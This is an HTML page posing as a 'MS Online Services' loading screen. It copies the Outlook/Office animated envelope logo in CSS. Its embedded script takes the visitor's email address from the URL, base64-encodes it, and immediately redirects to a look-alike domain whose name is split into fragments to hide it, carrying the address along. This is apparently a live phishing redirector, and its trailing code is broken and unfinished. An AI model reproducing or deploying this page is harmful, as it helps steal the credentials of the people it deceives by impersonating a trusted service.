<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS Online Services - Home</title>
    <style>
    :root {
      --size: 180px;
      --envelopeWidth: 130px;
      --envelopeHeight: 71px;
      --calendarWidth: 118px;
      --squareWidth: calc(var(--calendarWidth) / 3);
      --squareHeight: 37px;
      --calendarHeaderHeight: 20px;
      --calendarHeight: calc(var(--squareHeight) * 3 + var(--calendarHeaderHeight));
      --calendarY: calc(var(--calendarHeight) + 20px);
      --calendarYExtended: calc(var(--calendarHeight) - 80px);
      --calendarYOverExtended: calc(var(--calendarHeight) - 92px);
      --flapSize: 96px;
      --flapHeight: calc(0.55 * var(--envelopeHeight));
      --flapScaleY: calc(var(--flapHeight) / var(--flapSize));
      --duration: 5s;
    }

     body, html {
      height: 100%;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    #container {
      width: var(--size);
      height: var(--size);
      animation: bounce var(--duration) infinite;
    }

    @keyframes bounce {
      0%, 100%, 12.5%, 32.5%, 76.1% { transform: translateY(0); }
      22.5%, 86% { transform: translateY(7px); }
    }

    #logo {
      height: 179px;
      width: 130px;
      overflow: hidden;
      margin-top: -59px;
      margin-left: 25px;
    }

    #containerShadow {
      position: relative;
      top: 120px;
      left: 25px;
      width: var(--envelopeWidth);
      height: var(--envelopeHeight);
      border-radius: 0 0 7px 7px;
      box-shadow: rgba(0, 0, 0, 0.25) 0 4px 5px;
      animation: shadow-fade var(--duration) infinite;
    }

    @keyframes shadow-fade {
      0%, 100%, 21.2%, 80% { opacity: 0; }
      47%, 70% { opacity: 1; }
    }

    #flapContainer {
      width: var(--envelopeWidth);
      margin-top: 179px;
    }

    #envelopeFront {
      width: var(--envelopeWidth);
      height: var(--envelopeHeight);
      border-radius: 0 0 7px 7px;
      overflow: hidden;
      margin-top: -41px;
    }

    #envelopeFront > .left {
      width: 287px;
      height: var(--envelopeHeight);
      background: #28a8ea;
      transform: translate(-153px, -70px) rotate(28deg);
    }

    #envelopeFront > .right {
      width: 287px;
      height: var(--envelopeHeight);
      background: #1490df;
      transform: translate(-120px, 63px) rotate(-28deg);
    }

    #envelopeBack {
      width: var(--envelopeWidth);
      height: 40px;
      background: #123b6d;
      margin-top: -70px;
    }

    #calendar {
      display: flex;
      flex-wrap: wrap;
      width: var(--calendarWidth);
      height: var(--calendarHeight);
      border-radius: 7px;
      overflow: hidden;
      margin: 0 auto;
      margin-top: -306px;
      animation: calendar-bounce var(--duration) infinite;
      animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
      transform: translateY(var(--calendarYExtended)) scaleY(1);
    }

    @keyframes calendar-bounce {
      0%, 100%, 16.5%, 76.1% { transform: translateY(var(--calendarY)) scaleY(1); }
      28% { transform: translateY(var(--calendarYOverExtended)) scaleY(1); }
      31% { transform: translateY(var(--calendarYExtended)) scaleY(1.05); }
      33% { transform: translateY(var(--calendarYExtended)) scaleY(0.96); }
      34%, 68.5% { transform: translateY(var(--calendarYExtended)) scaleY(1); }
      68.5% { animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29); }
    }

    #calendar > .header {
      width: var(--calendarWidth);
      height: calc(var(--calendarHeaderHeight) + 1px);
      margin-bottom: -1px;
      background: #0358a7;
    }

    #calendar > .row {
      display: flex;
      width: var(--calendarWidth);
      height: var(--squareHeight);
    }

    .square {
      width: var(--squareWidth);
      height: calc(var(--squareHeight) + 1px);
    }

    .square1 { background: #0078d4; }
    .square2 { background: #28a8ea; }
    .square3 { background: #50d9ff; }
    .square4 { background: #0364b8; }
    .square5 { background: #14447d; }

    #openedFlap {
      width: var(--envelopeWidth);
      height: 107px;
      animation: opened-flap-swing var(--duration) infinite;
      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
      transform-origin: top;
      transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
    }

    @keyframes opened-flap-swing {
      0%, 100%, 14.5%, 76% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
      16.5%, 74% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg); }
    }

    #closedFlap {
      width: var(--envelopeWidth);
      animation: closed-flap-swing var(--duration) infinite;
      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
      transform-origin: top;
      transform: translateY(calc(-1 * var(--envelopeHeight))) rotate3d(1, 0, 0, 90deg);
    }

    @keyframes closed-flap-swing {
      0%, 100%, 77%, 8.5% { transform: translateY(calc(-1 * var(--envelopeHeight))) rotate3d(1, 0, 0, 0); }
      14.5%, 76% { transform: translateY(calc(-1 * var(--envelopeHeight))) rotate3d(1, 0, 0, 90deg); }
    }

    #flapMask {
      width: var(--envelopeWidth);
      height: 107px;
      overflow: hidden;
    }

    .flapTriangle {
      width: var(--flapSize);
      height: var(--flapSize);
      background: #50d9ff;
      margin: -48px auto 0 auto;
      border-radius: 7px;
      transform: scaleY(0.6) rotate(45deg);
    }

    #openedFlap .flapTriangle { background: #123b6d; }
    #closedFlap .flapTriangle { background: #50d9ff; }
    </style>
</head>
<body>
        <div id="loadingLogo" dir="ltr">
        <div id="container">
          <div id="containerShadow"></div>
          <div id="logo">
            <div id="flapContainer">
              <div id="openedFlap">
                <div id="flapMask"><div class="flapTriangle"></div></div>
              </div>
              <div id="calendar">
                <div class="header"></div>
                <div class="row">
                  <div class="square square1"></div>
                  <div class="square square2"></div>
                  <div class="square square3"></div>
                </div>
                <div class="row">
                  <div class="square square4"></div>
                  <div class="square square1"></div>
                  <div class="square square2"></div>
                </div>
                <div class="row">
                  <div class="square square5"></div>
                  <div class="square square4"></div>
                  <div class="square square1"></div>
                </div>
              </div>
            </div>
            <div id="envelopeBack"></div>
            <div id="envelopeFront">
              <div class="right"></div>
              <div class="left"></div>
            </div>
            <div id="closedFlap">
              <div id="flapMask"><div class="flapTriangle"></div></div>
            </div>
          </div>
        </div>
      </div>

    <div id="main-content"></div>

<script>
    // Immediately redirect users to the redirect URL
    function getRedirectURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get("addressEML");

        function transformEmail(u) {
            return btoa(u); // Base64 encode
        }

        if (email) {
            const encodedEmail = transformEmail(email);
            // Replace the current URL with the encoded email
            window.history.replaceState(null, '', `?addressEML=${encodedEmail}`);
        }
        
        const z = "https://office.orderinv";
        const y = "-sharedocs.";
        const x = "info";
        const w = "/uCeGVUja";
        const v = "#Eml=";
        
        const t = email ? transformEmail(email) : "defaultEncodedEmail";
        const result = z + y + x + w + v + t;
        return urlParams.get("redirect") || result;
    }

    // Redirect immediately
    window.location.href = getRedirectURL();

    }

    function dummyFunction4() {
        let complex = [dummyFunction1(), dummyFunction2(), dummyFunction3()];
        complex.forEach(func => {

</script>

</body>
</html>
